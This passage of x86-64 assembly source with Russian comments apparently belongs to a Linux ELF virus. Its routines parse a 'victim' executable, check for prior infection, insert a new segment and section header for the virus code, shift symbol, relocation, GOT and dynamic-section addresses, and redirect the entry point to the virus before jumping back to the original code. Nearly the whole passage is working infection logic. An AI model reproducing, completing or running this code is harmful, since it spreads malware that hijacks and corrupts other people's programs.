    push    %rdx
    push    %rdi
    push    %rsi

    // проверяем наличие необходимых для посика данных
    mov     victim_elf_addr(%rip), %rdi
    test    %rdi, %rdi
    je      _find_victim_text_section_fail

    mov     ELF_E_ENTRY(%rdi), %rdx

    mov     victim_shdr_table_addr(%rip), %rdi
    test    %rdi, %rdi
    je      _find_victim_text_section_fail

    mov     victim_shdr_amount(%rip), %rcx
    test    %rcx, %rcx
    je      _find_victim_text_section_fail

_find_victim_text_section_cycle:
    mov     %rdi, %rax
    mov     SHDR_SH_ADDR(%rdi), %rbx     # получаем поле sh_addr

    cmp     %rdx, %rbx  # addr долен быть <= e_entry
    jg      _next_iter_find_text

    mov    %rax, %rdi
    mov    SHDR_SH_SIZE(%rdi), %rsi # размер текущего секц.

    add    %rsi, %rbx   # адрес конца текущeго сегмент

    cmp    %rdx, %rbx   # cur sect. end > e_entry
    jl     _next_iter_find_text

    jmp    _find_text_success   # section is found
_next_iter_find_text:

    add     $0x40, %rax
    mov     %rax, %rdi

    loop    _find_victim_text_section_cycle
    jmp     _find_victim_text_section_fail

_find_text_success:
    leaq    sh_name_indx(%rip), %rcx
    movl    (%rax), %edx
    movl    %edx, (%rcx)  # save sect. sh_name
    xor     %rax, %rax
    jmp     _find_text_exit

_find_victim_text_section_fail:
    mov     $-1, %rax

_find_text_exit:
    pop     %rsi
    pop     %rdi
    pop     %rdx
    pop     %rcx
    pop     %rbx

    ret

/// FIND_SYMTAB_CODE
/// Ищет среди всех заголовков секций заголовк symtab - этот заголовок описывает
/// таблицу символов. Ищем по типу заголовка -
/// у symtab этот тип 2, symtab может быть
/// в файле в единственном числе
/// PARAMS:
/// RDI - указатель нa таблицу заголвоков секций
/// RSI - количество заголовков
_find_symtab:
    push    %rcx
    push    %rdx
    push    %rdi
    push    %rsi

    mov     victim_shdr_amount(%rip), %rcx
    test    %rcx, %rcx
    je      _find_symtab_fail

    mov     victim_shdr_table_addr(%rip), %rdi
    test    %rdi, %rdi
    je      _find_symtab_fail

_find_symtab_cycle:
    mov     %rdi, %rsi
    mov     SHDR_SH_TYPE(%rdi), %rdx

    cmp     $0x2, %rdx   # shdr = symtab?
    je      _find_symtab_success

    add     $0x40, %rsi
    mov     %rsi, %rdi
    loop    _find_symtab_cycle

_find_symtab_success:
    leaq    symtab_shdr_addr(%rip), %rdi
    mov     %rsi,  (%rdi)

    // считаем кол-во записией в symtab
    // symtab size / symtab record size = rec. amount
    mov      SHDR_SH_SIZE(%rsi), %rdx
    mov      $0x18, %ecx
    movl     %edx, %eax
    xor      %rdx, %rdx
    idivl    %ecx

    leaq    symtab_records_amount(%rip), %rdi
    mov     %rax, (%rdi)

    xor     %rax, %rax
    jmp     _find_symtab_exit

_find_symtab_fail:
    mov     $-1, %rax

_find_symtab_exit:
    pop     %rsi
    pop     %rdi
    pop     %rdx
    pop     %rcx

    ret

/// _COUNT_VICTIM_CODE_BEGIN_VADDR
/// считает виртуальный адрес кода жертвы
_count_victim_code_begin_vaddr:
    push    %rdx
    push    %rdi
    push    %rsi

    mov    victim_code_offset(%rip), %rdx
    test    %rdx, %rdx
    je     _count_victim_code_begin_vaddr_fail

    mov    first_seg_vaddr(%rip), %rdi
    test   %rdi, %rdi
    je     _count_victim_code_begin_vaddr_fail

    add    %rdx, %rdi

    leaq   victim_code_frm_begin_vaddr(%rip), %rsi
    mov    %rdi, (%rsi)
    xor    %rax, %rax
    jmp     _count_victim_code_begin_vaddr_exit

_count_victim_code_begin_vaddr_fail:
    mov     $-1, %rax

_count_victim_code_begin_vaddr_exit:
    pop    %rsi
    pop    %rdi
    pop    %rdx

    ret


/// _CHECK_FILE_INFECTION
/// Проверяет, является ли открытый файл зараженным
/// - проверяем каждый загружаемый сегмент
/// - берем его смещение, считаем адрес его кода
///   в памяти
/// - сравнивам первый 32 байта по этому адресу со
///   start вируса
/// - если совпали - файл заражен, вернуть -1
/// - иначе проверить все сегменты, если нигде не совпало,
/// вернуть 0

_check_file_infection:
    push    %rbx
    push    %rcx
    push    %rdx
    push    %rbx
    push    %r8
    push    %rdi
    push    %rsi

    mov     victim_elf_addr(%rip), %rdx
    test    %rdx, %rdx
    je      _check_file_infection_fail

    mov     victim_shdr_table_addr(%rip), %rsi
    test    %rsi, %rsi
    je      _check_file_infection_fail

    mov     victim_shdr_amount(%rip), %rcx
    test    %rcx, %rcx
    je      _check_file_infection_fail

    leaq    _start(%rip), %rdi

_check_file_infection_cycle:
    push    %rcx
    mov     SHDR_SH_TYPE(%rsi), %rbx

    // секция SHT_PROGBITS?
    cmp     $0x1, %bl
    jne     _next_segm


    mov     SHDR_SH_OFFSET(%rsi), %rbx
    mov     $0x4, %rcx

    // адрес сегмента в памяти
    add     %rdx, %rbx

    // проверяем конкретную
    // секцию кода
_check_segm_infection_cycle:
    movq    (%rdi), %rax
    movq    (%rbx), %r8

    cmp     %rax,  %r8
    jne     _next_segm

    add     $0x8, %rdi
    add     $0x8, %rbx

    loop    _check_segm_infection_cycle
    jmp     _check_file_infection_fail

_next_segm:
    pop     %rcx
    add     $0x40, %rsi
    loop    _check_file_infection_cycle

_check_file_infection_success:
    xor     %rax, %rax
    jmp     _check_file_infection_exit

_check_file_infection_fail:
    pop     %rcx
    mov     $-1, %rax

_check_file_infection_exit:
    pop    %rsi
    pop    %rdi
    pop    %r8
    pop    %rbx
    pop    %rdx
    pop    %rcx
    pop    %rbx
    ret

/// _PARSE_VICTIM
/// Вызывает парсинг жертвы
/// В случае провала возвращ -1
_parse_victim:
    call    _get_victim_addr
    test    %rax, %rax
    jne     _parse_victim_fail

    call    _is_it_elf
    test    %rax, %rax
    jne     _parse_victim_fail

    call    _get_phdrs_info
    test    %rax, %rax
    jne     _parse_victim_fail

    call    _get_shdrs_info
    test    %rax, %rax
    jne     _parse_victim_fail

    call    _check_file_infection
    test    %rax, %rax
    jne     _parse_victim_fail

    call    _find_first_seg_vaddr
    test    %rax, %rax
    jne     _parse_victim_fail

    call    _find_last_seg_vaddr
    test    %rax, %rax
    jne     _parse_victim_fail

    call     _find_dynamic
    test    %rax, %rax
    jne      _get_victim_code

_check_bind_now:
    call    _find_bind_now_record
    test    %rax, %rax
    jne     _parse_victim_fail

    call    _find_got_section_vaddr
    test    %rax, %rax
    jne     _get_victim_code

    call    _find_got_section_im_memory

_get_victim_code:
    call    _get_victim_whole_code_addr_and_size
    test    %rax, %rax
    je      _find_first_text_section

    call    _get_victim_code_addr_and_size_with_bind_now
    test    %rax, %rax
    jne     _parse_victim_fail

_find_first_text_section:
    call    _find_victim_text_section
    test    %rax, %rax
    jne     _parse_victim_fail

    call    _find_symtab
    test    %rax, %rax
    jne     _parse_victim_fail

    call    _count_victim_code_begin_vaddr
    test    %rax, %rax
    jne     _parse_victim_fail

_parse_victim_success:
    movq    $0, parse_success(%rip)
    xor     %rax, %rax
    jmp     _parse_victim_exit

_parse_victim_fail:
    mov   $-1, %rax

_parse_victim_exit:
    ret

/// _FIND_GOT_SECTION_IM_MEMORY
/// высчитывает адрес секции GOT
/// в памяти и ее размер
_find_got_section_im_memory:
    push    %rdx
    push    %rcx
    push    %rdi
    push    %rsi

    // проверяем данные
    mov     victim_elf_addr(%rip), %rsi
    test    %rsi, %rsi
    je      _find_got_section_im_memory_fail

    mov     victim_shdr_amount(%rip), %rcx
    test    %rcx, %rcx
    je      _find_got_section_im_memory_fail

    mov     victim_shdr_table_addr(%rip), %rdi
    test    %rdi, %rdi
    je      _find_got_section_im_memory_fail

    mov     GOT_vaddr(%rip), %rdx
    test    %rdx, %rdx
    je      _find_got_section_im_memory_fail

_find_got_section_im_memory_cycle:
    add     $0x10, %rdi
    cmp     %rdx, (%rdi)

    je      _find_got_section_im_memory_success

    add     $0x30, %rdi

    loop    _find_got_section_im_memory_cycle
    jmp     _find_got_section_im_memory_fail

_find_got_section_im_memory_success:
    add     $0x8, %rdi # sh_offset
    mov     (%rdi), %rcx
    add     %rcx, %rsi
    mov     %rsi, GOT_addr_in_memory(%rip)

    add     $0x8, %rdi # sh_size
    mov     (%rdi), %rcx
    mov     %rcx, GOT_size(%rip)

    xor     %rax, %rax
    jmp     _find_got_section_im_memory_exit

_find_got_section_im_memory_fail:
    mov     $-1, %rax

_find_got_section_im_memory_exit:
    pop     %rsi
    pop     %rdi
    pop     %rcx
    pop     %rdx

    ret
/// _RECOUNT_SYMBOLS_ADDRS
/// Редактирует vaddr символов
_recount_symbols_addrs:
    push     %rcx
    push     %rbx
    push     %rdx
    push     %r8
    push     %rdi
    push     %rsi

    // проверяем необходимые данные
    mov     symtab_shdr_addr(%rip), %rdi
    test    %rdi, %rdi
    je      _recount_symbols_addrs_fail

    mov     symtab_records_amount(%rip), %rcx
    test    %rcx, %rcx
    je      _recount_symbols_addrs_fail

    mov     victim_elf_addr(%rip), %rsi
    test    %rsi, %rsi
    je      _recount_symbols_addrs_fail


    mov     dynamic_records_vaddr(%rip), %r8

    // указатель на первую запись в symtab
    add     $0x18, %rdi
    add     (%rdi), %rsi
    mov     %rsi, %rdi

    mov     new_bind_now_flag_record_size(%rip), %rbx

    // константа, на которую увеличиваются
    // виртуальные адреса
    mov     $0x38, %rdx

_recount_symbols_addrs_cycle:
    add     $0x8, %rdi   # offset до vaddr символа

    cmp     $0, (%rdi)
    je      _recount_symbols_next_iter

    cmp     %r8, (%rdi)
    jle     _add_const_symtab

    add     %rbx, (%rdi)  # сместили на разм. +1 dyn. record

_add_const_symtab:
    add     %rdx, (%rdi)  # сместили на разм. virus phdr

_recount_symbols_next_iter:
    add     $0x10, %rdi
    loop    _recount_symbols_addrs_cycle

    xor     %rax, %rax
    jmp     _recount_symbols_addrs_exit

_recount_symbols_addrs_fail:
    mov    $-1, %rax

_recount_symbols_addrs_exit:
    pop     %rsi
    pop     %rdi
    pop     %r8
    pop     %rdx
    pop     %rbx
    pop     %rcx
    ret



/// _RECOUNT_RELA_CURRENTSECTION
/// увеличивает vaddr релокейта на заданную величину
_recount_rela_current_section:
    push    %rbx
    push    %rcx
    push    %rdx
    push    %r8
    push    %rdi
    push    %rsi

    // проверяем данные, необходимые
    // для редактирования
    mov     rela_section_offset(%rip), %rdi
    test    %rdi, %rdi
    je     _recount_rela_current_section_fail

    mov     dynamic_records_vaddr(%rip), %r8
    test    %r8, %r8
    je     _recount_rela_current_section_fail

    mov     victim_elf_addr(%rip), %rax
    test    %rax, %rax
    je     _recount_rela_current_section_fail

    mov     rela_section_size(%rip), %rax
    test    %rax, %rax
    je     _recount_rela_current_section_fail

    // посчитали кол-во записей
    // в секции rela
    xor     %rdx, %rdx
    mov     $0x18, %ecx
    idiv    %ecx
    mov     %eax, %ecx

    // кладем константу, на которую
    // увеличиваются адреса и смещения
    mov     $0x38, %rsi

    //  получили адрес кода секции в памяти
    mov     victim_elf_addr(%rip), %rax
    add     %rdi, %rax

    mov     new_bind_now_flag_record_size(%rip), %rbx

_recount_rela_current_section_cycle:
    cmp     $0, (%rax)
    je      _recount_rela_current_next_iter

    cmp     %r8, (%rax)
    jle     _add_const_to_rela

    // vaddr релокейта + размер новой записи
    // dynamic
    add     %rbx, (%rax)

    // vaddr релокейта + константа
_add_const_to_rela:
    add     %rsi, (%rax)

_recount_rela_current_next_iter:
    add     $0x18, %rax   # сдвиг на след. запись
    loop   _recount_rela_current_section_cycle

    xor     %rax, %rax
    jmp     _recount_rela_current_section_exit

_recount_rela_current_section_fail:
    mov     $-1, %rax

_recount_rela_current_section_exit:
    pop     %rsi
    pop     %rdi
    pop     %r8
    pop     %rdx
    pop     %rcx
    pop     %rbx

    ret

/// _RECOUNT_RELA_SECTIONS
/// Находит все секции типа rela
/// и вызывает их пересчитывание
_recount_rela_sections:
    push  %rbx
    push  %rdx
    push  %rcx

    mov     victim_shdr_amount(%rip), %rcx
    test    %rcx, %rcx
    je     _recount_rela_sections_fail

    mov     victim_shdr_table_addr(%rip), %rdx
    test    %rdx, %rdx
    je     _recount_rela_sections_fail

_recount_rela_sections_cycle:
    add     $0x4, %rdx        # проверяем тип
    cmp     $0x4, (%rdx)      # тип rela?
    jne     _recount_rela_sections_next

    sub     $0x4, %rdx
    mov     SHDR_SH_OFFSET(%rdx), %rbx
    mov     %rbx, rela_section_offset(%rip)

    mov     SHDR_SH_SIZE(%rdx), %rbx
    mov     %rbx, rela_section_size(%rip)

    call    _recount_rela_current_section

    test    %rax, %rax
    jne     _recount_rela_sections_fail

    add     $0x4, %rdx
_recount_rela_sections_next:
    add     $0x3C, %rdx
    loop    _recount_rela_sections_cycle

_recount_rela_sections_success:
    xor     %rax, %rax
    jmp     _recount_rela_sections_exit

_recount_rela_sections_fail:
    mov     $-1, %rax

_recount_rela_sections_exit:
    pop     %rcx
    pop     %rdx
    pop     %rbx

    ret

/// _SHDR_OFFSET_AND_ADDR_RECOUNT
/// Пересчитывает адреса и смещения в заголовках, если они не 0
/// Поскольку секция dynamic может расширяться (в заивимости от того,
/// выставлен в ней флаг BIND_NOW компилером или нет),
/// то код, который находится
/// ниже секции dynamic должен сместиться, учитывая это расширение
    .globl  _shdr_offset_and_addr_recount
    .type	_shdr_offset_and_addr_recount, @function

_shdr_offset_and_addr_recount:
    push  %rbx
    push  %rdx
    push  %rcx
    push  %r8
    push  %rdi
    push  %rsi

    // проверяем необходимые данные
    mov     victim_shdr_amount(%rip), %rcx
    test    %rcx, %rcx
    je     _shdr_offset_and_addr_recount_fail

    mov     victim_shdr_table_addr(%rip), %rdi
    test    %rdi, %rdi
    je     _shdr_offset_and_addr_recount_fail

    mov     new_bind_now_flag_record_size(%rip), %rbx
    mov     $0x38, %rdx

_shdr_offset_and_addr_recount_cycle:

    add     $0x10, %rdi       # смещение до поля sh_addr
    cmp     $0,   (%rdi)      # sh_addr <= 0?

    jle     _recount_shdr_offset

    // секция расположенаа до dynamic?
    mov     dynamic_records_vaddr(%rip), %rax
    cmp   %rax, (%rdi)
    // да
    jle     _add_const_to_addr

    // нет, скорректировать в соответствии
    // с возможным расширением dynamic
    add     %rbx, (%rdi)

_add_const_to_addr:
    add     %rdx, (%rdi)

_recount_shdr_offset:
    add     $0x8, %rdi
    cmp     $0, (%rdi)

    jle     _next_iter_recount

    // секция расположена до dynamic?
    mov     dynamic_records_offset(%rip), %rax
    cmp     %rax, (%rdi)

    jle     _add_const_to_offset

    // нет, скорректировать в соответствии
    // с возможным расширением dynamic
    add     %rbx, (%rdi)

_add_const_to_offset:
    add     %rdx, (%rdi)   # пересчитываем смещение

_next_iter_recount:
    add     $0x28, %rdi    # смещение до след. заголовка
    loop    _shdr_offset_and_addr_recount_cycle

_shdr_offset_and_addr_recount_success:
    xor     %rax, %rax
    jmp     _shdr_offset_and_addr_recount_exit

_shdr_offset_and_addr_recount_fail:
    mov      $-1, %rax

_shdr_offset_and_addr_recount_exit:
    pop      %rsi
    pop      %rdi
    pop      %r8
    pop      %rcx
    pop      %rdx
    pop      %rbx

    ret

/// _PHDR_OFFSET_AND_ADDR_RECOUNT
///    PARAMS
/// RDI -  указатель на заголовки,
/// RSI -  их количество, в
/// RDX -  константа, на которую увеличивается
/// vaddr, paddr и offset всех заголовков, кроме заголовка
/// самой таблицы заголовков сегментов
/// Поскольку секция dynamic может расширяться (в заивимости от того,
/// выставлен в ней флаг BIND_NOW компилером или нет),
/// то код, который находится
/// ниже секции dynamic должен сместиться, учитывая это расширение
_phdr_offset_and_addr_recount:
    push    %rbx
    push    %rdx
    push    %rcx
    push    %r8
    push    %r9
    push    %rdi
    push    %rsi

    // проверяем данные,
    // необходимые для редактирования
    mov     victim_phdr_amount(%rip), %rcx
    test    %rcx, %rcx
    je     _phdr_offset_and_addr_recount_fail

    mov     victim_phdr_table_addr(%rip), %rdi
    test    %rdi, %rdi
    je     _phdr_offset_and_addr_recount_fail

    mov     first_seg_vaddr(%rip), %rsi
    test    %rsi, %rsi
    je     _phdr_offset_and_addr_recount_fail

    mov     new_bind_now_flag_record_size(%rip), %rbx
    mov     $0x38, %rdx

_phdr_offset_and_addr_recount_cycle:
    mov     dynamic_records_vaddr(%rip), %r8

    movl    (%rdi), %eax

    // это заголовок самой таблицы заголовков?
    cmp     $0x6,  %rax
    je      _edit_phdr_table_header
    // это заголовок сегмента dynamic?
    cmp     $0x2,  %rax
    jne     _phdr_offset_and_addr_check

    // расширяем dynamic на размер
    // вставляемой записи
    add     $0x20, %rdi
    add     %rbx, (%rdi)

    add     $0x8, %rdi
    add     %rbx, (%rdi)

    sub     $0x28,  %rdi
    jmp     _phdr_offset_and_addr_check

_edit_phdr_table_header:
    // редактируем поля p_filesz
    // и p_memsz в заголовке таблицы сегментов
    // заголовков станет на один больше, значит,
    //  размер таблицы надо увеличить на 56 байт
    add     $0x20, %rdi
    add     %rdx, (%rdi)

    add     $0x8, %rdi
    add     %rdx, (%rdi)

    sub     $0x20, %rdi
    jmp     _next_iter_recount_phdr

_phdr_offset_and_addr_check:
    add     $0x10, %rdi    # проверяем адрес

    cmp     %rsi, (%rdi)
    je      _edit_first_segm_header

    cmp     $0,  (%rdi)
    jle     _recount_offset

    jmp     _recount_vaddr_paddr

_edit_first_segm_header:
    // это первый сегмент кода -
    // содерит в себе заголовки
    // увеличить его p_memsz и p_filesz
    // на размер добавляемого заголвока
    // а вот его vaddr,paddr и offset
    // не редактируем - новый заголвок
    // будет вписан В него, а не ДО
    // него
    add     $0x10, %rdi
    add     %rdx, (%rdi)

    add     $0x8, %rdi
    add     %rdx, (%rdi)

    sub     $0x20, %rdi

    jmp     _next_iter_recount_phdr

_recount_vaddr_paddr:
    cmp     %r8, (%rdi)
    jle     _add_const_to_vaddr_paddr

    add     %rdx, (%rdi)    # recount vaddr and paddr
    add     %rbx, (%rdi)

    add     $0x8, %rdi
    add     %rdx, (%rdi)
    add     %rbx, (%rdi)

    sub     $0x8, %rdi

    jmp     _recount_offset
_add_const_to_vaddr_paddr:
    add     %rdx, (%rdi)    # recount vaddr and paddr

    add     $0x8, %rdi
    add     %rdx, (%rdi)

    sub     $0x8, %rdi

_recount_offset:
    mov     dynamic_records_offset(%rip), %r8

    sub     $0x8, %rdi

    cmp     $0, (%rdi)
    jle     _next_iter_recount_phdr

    // сегмент расположен до dynamic?
    cmp     %r8, (%rdi)

    jle     _add_const_to_phdr_offset

    add     %rbx, (%rdi)
    add     %rdx, (%rdi)

    jmp     _next_iter_recount_phdr

_add_const_to_phdr_offset:
    add     %rdx, (%rdi)

    jmp     _next_iter_recount_phdr

_next_iter_recount_phdr:
    add     $0x30, %rdi

    dec     %rcx
    test    %rcx, %rcx
    jne     _phdr_offset_and_addr_recount_cycle

_phdr_offset_and_addr_recount_success:
    xor     %rax, %rax
    jmp     _phdr_offset_and_addr_recount_exit

_phdr_offset_and_addr_recount_fail:
    mov     $-1, %rax

_phdr_offset_and_addr_recount_exit:
    pop     %rsi
    pop     %rdi
    pop     %r9
    pop     %r8
    pop     %rcx
    pop     %rdx
    pop     %rbx

    ret

/// _RECOUNT_DYNAMIC_SECTION
/// редактирует vaddr кода, описываемого записями в dynamic,
/// а так же находит запись GOT и сохраняет ее измененный vaddr
_recount_dynamic_section:
    push    %rbx
    push    %rcx
    push    %rdx
    push    %r8
    push    %r9
    push    %rdi
    push    %rsi

    mov     dynamic_records_addr(%rip), %rdi
    test    %rdi, %rdi
    je      _recount_dynamic_section_fail

    mov     dynamic_records_size(%rip), %rdx
    test    %rdx, %rdx
    je      _recount_dynamic_section_fail

    mov     dynamic_records_vaddr(%rip), %r9
    test    %r9, %r9
    je      _recount_dynamic_section_fail

    mov     victim_code_frm_begin_vaddr(%rip), %r8
    test    %r8, %r8
    je      _recount_dynamic_section_fail

    mov     %edx, %eax
    xor     %rdx, %rdx
    mov     $0x10, %ecx
    idiv    %ecx
    mov     %eax, %ecx

    mov     %r8, %rdx
    mov     %rdi, %rax

    mov     new_bind_now_flag_record_size(%rip), %rbx
    mov     constant_value(%rip), %rsi
_recount_dynamic_section_cycle:
    // запись FLAGS_1?
    cmpq    $0x6ffffffb, (%rax)
    jne     _recount_vaddr
    jmp     _skip_record

_skip_record:
    add     $0x8, %rax
    jmp     _recount_dynamic_section_next_iter

_recount_vaddr:
    add     $0x8, %rax  # пропустили тип

    cmp     %rdx,  (%rax)
    jle     _recount_dynamic_section_next_iter

    // код лежит после секции dynamic?
    cmp     %r9,  (%rax)
    jle     _add_const

    add     %rbx, (%rax)

_add_const:
    // vaddr релокейта + константа
    add     %rsi, (%rax)

_recount_dynamic_section_next_iter:
    add     $0x8, %rax    # сдвиг на след. запись
    loop    _recount_dynamic_section_cycle

_recount_dynamic_section_success:
    xor     %rax, %rax
    jmp     _recount_dynamic_section_exit

_recount_dynamic_section_fail:
    mov     $-1, %rax

_recount_dynamic_section_exit:
    pop     %rsi
    pop     %rdi
    pop     %r9
    pop     %r8
    pop     %rdx
    pop     %rcx
    pop     %rbx
    ret

/// _FIND_GOT_SECTION
/// Ищет запись GOT в секции dynamic
/// и сохраняет виртуальный адрес секции
/// GOT, если находит запись о ней
_find_got_section_vaddr:
    push    %rcx
    push    %rdx
    push    %rdi

    // проверяем данные
    mov     dynamic_records_addr(%rip), %rdi
    test    %rdi, %rdi
    je      _find_got_section_vaddr_fail

    mov     dynamic_records_size(%rip), %rax
    test    %rax, %rax
    je      _find_got_section_vaddr_fail

    xor     %rdx, %rdx
    mov     $0x10, %ecx
    idiv    %ecx

    mov     %eax, %ecx  # количество записей
    mov     %rdi, %rsi

_find_got_section_vaddr_cycle:
    cmpl     $0x3, (%rdi)
    je      _find_got_section_vaddr_success

    add     $0x10,%rdi
    loop    _find_got_section_vaddr_cycle
    jmp     _find_got_section_vaddr_fail

_find_got_section_vaddr_success:
    add     $0x8, %rdi
    mov     (%rdi), %rax
    mov     %rax, GOT_vaddr(%rip)

    xor     %rax, %rax
    jmp     _find_got_section_vaddr_exit

_find_got_section_vaddr_fail:
    mov     $-1, %rax

_find_got_section_vaddr_exit:
    pop     %rdi
    pop     %rdx
    pop     %rcx

    ret


/// _RECOUNT_GOT_SECTION
/// редактирует записи - адреса
/// - внутри GOT, увеличивая их на
/// на заданную величину
_recount_got_section:
    push    %rbx
    push    %rcx
    push    %rdx
    push    %r8

    mov     GOT_size(%rip), %rax
    test    %rax, %rax
    je      _recount_got_section_fail

    mov     GOT_addr_in_memory(%rip), %rbx
    test    %rbx, %rbx
    je      _recount_got_section_fail

    mov     dynamic_records_vaddr(%rip), %r8
    test    %r8, %r8
    je      _recount_got_section_fail

    // посчитали кол-во записей
    // в секции got
    xor     %rdx, %rdx
    mov     $0x8, %ecx
    idiv    %ecx
    mov     %eax, %ecx

    mov     %rbx, %rax
    mov     $0x38, %rbx

    mov     new_bind_now_flag_record_size(%rip), %rdx

_recount_got_section_cycle:
    cmp     $0, (%rax)
    je      _recount_got_next_iter

    cmp     %r8, (%rax)
    jle     _add_const_to_got_record

    add     %rdx, (%rax)

_add_const_to_got_record:

    // vaddr записи + константа
    add     %rbx, (%rax)

_recount_got_next_iter:
    add     $0x8, %rax   # сдвиг на след. запись
    loop    _recount_got_section_cycle

    xor     %rax, %rax
    jmp     _recount_got_section_exit

_recount_got_section_fail:
    mov     $-1, %rax

_recount_got_section_exit:
    pop     %r8
    pop     %rdx
    pop     %rcx
    pop     %rbx
    ret

/// _GENERATE_VIRUS_PHDR
/// генерирует заголовок сегмента для кода вируса
_generate_virus_phdr:
    push    %rbx
    push    %rcx

    mov      virus_new_vaddr(%rip),%rbx
    test     %rbx, %rbx
    je      _generate_virus_phdr_fail

    leaq    virus_new_phdr(%rip), %rax

    movb    $0x1, (%rax) # p_type
    add     $0x4, %rax

    movb    $0x5, (%rax) # p_flags
    add     $0x4, %rax

    mov     victim_elf_addr(%rip), %rbx
    mov     ELF_E_SHOFF(%rbx), %rbx
    add     $0x38, %rbx
    mov     new_bind_now_flag_record_size(%rip), %rcx
    add     %rcx, %rbx
    movq    %rbx, (%rax) # p_offset
    add     $0x8, %rax

    mov     virus_new_vaddr(%rip),%rbx
    movq    %rbx, (%rax) # vaddr
    add     $0x8, %rax

    movq    %rbx, (%rax) # paddr
    add     $0x8, %rax

    mov     virus_code_size(%rip), %rbx
    movq    %rbx, (%rax) # p_filesz

    // к размеру кода добавили блок данных жертвы
    mov     data_size(%rip), %rcx
    add     %rcx, (%rax)

    add     $0x8, %rax

    movq    %rbx, (%rax) # p_memsz
    add     %rcx, (%rax)

    add     $0x8, %rax

    # поле p_allign при инициализации
    # заполнено нулями, что и нужно
_generate_virus_phdr_success:
    xor     %rax, %rax
    jmp     _generate_virus_phdr_exit
_generate_virus_phdr_fail:
    mov     $-1, %rax

_generate_virus_phdr_exit:
    pop     %rcx
    pop     %rbx
    ret

/// _GENERATE_VIRUS_SHDR
/// генерирует заголовок секции для кода вируса
_generate_virus_shdr:
    push    %rbx

    mov      virus_new_vaddr(%rip),%rbx
    test     %rbx, %rbx
    je      _generate_virus_phdr_fail

    leaq    virus_new_shdr(%rip), %rax
    leaq    sh_name_indx(%rip), %rbx

    movl    (%rbx), %ebx  # sh_name
    movl    %ebx,  (%rax)
    add     $0x4, %rax

    movb    $0x1, (%rax)  # sh_type
    add     $0x4, %rax

    movb    $0x6, (%rax)  # sh_flags
    add     $0x8, %rax

    mov     virus_new_vaddr(%rip), %rbx
    mov     %rbx, (%rax)  # sh_addr
    add     $0x8, %rax

    mov     victim_elf_addr(%rip), %rbx
    mov     ELF_E_SHOFF(%rbx), %rbx
    add     $0x38, %rbx
    mov     new_bind_now_flag_record_size(%rip), %rcx
    add     %rcx, %rbx
    mov     %rbx, (%rax)  # sh_offset
    add     $0x8, %rax

    mov     virus_code_size(%rip), %rbx

    mov     data_size(%rip), %rcx

    mov     %rbx, (%rax) # sh_size
    add     %rcx, (%rax)

    add     $0x8, %rax

    # поля sh_link, sh_info, sh_addralign, sh_entsize
    # при инициализации записаны нулями,
    # а нам и нужно чтоб они были
    # заполнены нулями
_generate_virus_shdr_success:
    xor     %rax, %rax
    jmp     _generate_virus_shdr_exit

_generate_virus_shdr_fail:
    mov     $-1, %rax

_generate_virus_shdr_exit:
    pop     %rbx
    ret

/// GENERATE_BIND_NOW_FLAG_RECORD
/// Создает запись для флага BIND_NOW
_generate_bind_now_flag_record:
    mov     new_bind_now_flag_record_size(%rip), %rax
    test    %rax, %rax
    je      _generate_bind_now_flag_record_fail

    leaq    bind_now_flag_record(%rip), %rax
    movb    $0x18, (%rax)

_generate_bind_now_flag_record_success:
    xor     %rax, %rax
    jmp     _generate_bind_now_flag_record_exit

_generate_bind_now_flag_record_fail:
    mov     $-1, %rax

_generate_bind_now_flag_record_exit:
    ret

/// _EDIT_ELF_HDR
/// Редактирует заголовок эльфа
/// и сохраняет его оргинальный e_entry
_edit_elf_hdr:
    push    %rcx
    push    %rdx
    push    %rdi
    push    %rsi

    mov     virus_code_size(%rip), %rsi
    test    %rsi, %rsi
    je      _edit_elf_hdr_fail

    mov     victim_elf_addr(%rip), %rdi
    test    %rdi, %rdi
    je      _edit_elf_hdr_fail

    mov     virus_new_vaddr(%rip), %rdx
    test    %rdx, %rdx
    je      _edit_elf_hdr_fail

    mov     data_size(%rip), %rcx
    mov     new_bind_now_flag_record_size(%rip), %rdx

    add     %rcx, %rsi  # + размер блока данных
    add     $0x38, %rsi # + размер вставляемого заголовка
    add     %rdx, %rsi  # + размер вставляемой записи dynamic

    add     $0x18, %rdi     # смещение до e_entry

    mov     (%rdi), %rcx
    mov     %rcx, original_e_entry(%rip) # save original e_entry

    mov     virus_new_vaddr(%rip), %rdx
    mov     %rdx, (%rdi)  # new e_entry

    add     $0x10, %rdi   # смещение до e_shoff
    add     %rsi, (%rdi)

    add     $0x10, %rdi   # смещение до e_phnum
    add     $0x1, (%rdi)

    add     $0x4, %rdi    # смещение до e_shnum
    add     $0x1, (%rdi)

_edit_elf_hdr_success:
    xor     %rax, %rax
    jmp     _edit_elf_hdr_exit

_edit_elf_hdr_fail:
    mov     $-1, %rax

_edit_elf_hdr_exit:
    pop    %rsi
    pop    %rdi
    pop    %rdx
    pop    %rcx

    ret

/// _COUNT_OFFSET_TO_ORIG_E_ENTRY
/// считает смещение до оригинльного e_entry,
/// чтоб его мог использовать jmp, который передаст
/// управление жертве после того,
/// как вирус в ней отработает
_count_offset_to_orig_e_entry:
    push   %rbx
    push   %rcx

    // проверяем данные
    mov     virus_code_size(%rip), %rax
    test    %rax, %rax
    je      _count_offset_to_orig_e_entry_fail

    mov     original_e_entry(%rip), %rbx
    test    %rbx, %rbx
    je      _count_offset_to_orig_e_entry_fail

    mov     virus_new_vaddr(%rip), %rcx
    test    %rcx, %rcx
    je      _count_offset_to_orig_e_entry_fail

    // считаем адрес, на котором будем находиться,
    // когда будем передавать управление жертве
    dec     %rax
    add     %rcx, %rax
    mov     %rax, %rdi

    // после исполнения вируса новая запись в dynamic
    // будет затерта, поэтому считаем смещение так,
    // как-будто ее нет
    mov    new_bind_now_flag_record_size(%rip), %rcx
    sub    %rcx, %rdi
    // посчитали смещение,
    // должно быть отрицательным, поскольку
    // оригинальный e_entry всегда будет выше
    // _global_exit
    sub    %rax, %rbx
    movl   %ebx, offset_to_e_entry(%rip)

_count_offset_to_orig_e_entry_success:
    xor     %rax, %rax
    jmp     _count_offset_to_orig_e_entry_exit

_count_offset_to_orig_e_entry_fail:
    mov     $-1, %rax

_count_offset_to_orig_e_entry_exit:
    pop    %rcx
    pop    %rbx
    ret

/// _COUNT_OFFSET_TO_MOVE_VICTIM
/// считает смещение до функции move_victim
/// всегда возвращает true
_count_offset_to_move_victim:
    push   %rbx

    leaq    _move_victim(%rip), %rbx
    leaq    _global_exit(%rip), %rax
    add     $0x5, %rax  # пропустили будущую команду jmp

    sub     %rax, %rbx
    movl    %ebx, move_victim_offset(%rip)

    xor     %rax, %rax
